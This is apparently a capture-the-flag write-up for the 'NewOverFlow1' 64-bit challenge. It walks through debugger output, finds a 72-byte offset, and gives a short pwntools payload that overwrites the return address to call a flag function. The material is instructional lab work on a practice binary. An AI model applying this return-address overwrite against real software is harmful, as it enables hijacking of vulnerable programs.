# NewOverFlow1

Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this program. You can find it in /problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a on the shell server.

## TODO

- [x] Create python script to complete challenge
- [x] What is the exploitable piece of code?  
- [x] How are we going to exploit it?
- [x] The exploit
- [ ] Is there any similar challenges I can link to?

### Exploitable piece of code

This challenge mirrors OverFlow1 except it is 64 bits. The program once again uses gets to fill a buffer, and we are once again trying to rewrite the saved EIP in order to return to the flag() function.

### How are we going to exploit it?

When we initially run this code we get no output. However, this program will make more sense if you look at it in pwndbg we see that when we hit the end of vuln our RSP is moving our return address into place at address 0x40084a:
```
RBP  0x7fffffffdf80 —▸ 0x400860 (__libc_csu_init) ◂— push   r15
RSP  0x7fffffffdf58 —▸ 0x40084a (main+98) ◂— mov    eax, 0
RIP  0x4007e7 (vuln+27) ◂— ret  
```
but if we disassemble the program we see that we want to return to the flag function which is at 0x400768. So if we overflow the buffer with a cyclic string we get these results in our registers:
```
RBP  0x6161617261616171 ('qaaaraaa')
RSP  0x7fffffffdf58 ◂— 'saaataaauaaavaaawaaaxaaayaaa'
RIP  0x4007e7 (vuln+27) ◂— ret
```
Since this is a 64 bit program we are looking for what is in the RSP when it segfaults. So if we run cyclic_find() on the value in RSP we get the value of 72.

### The exploit

So now that we know our offset is 72 bytes, we must create a payload with 72 bytes of data, plus our flag_address+1 since this is a 64 bit problem. Our setup should look like this:
```
payload = "A"*72
flag_address = elf.symbols['flag']
payload += p64(flag_address+1)
```
Now we just send the payload and we receive the flag.
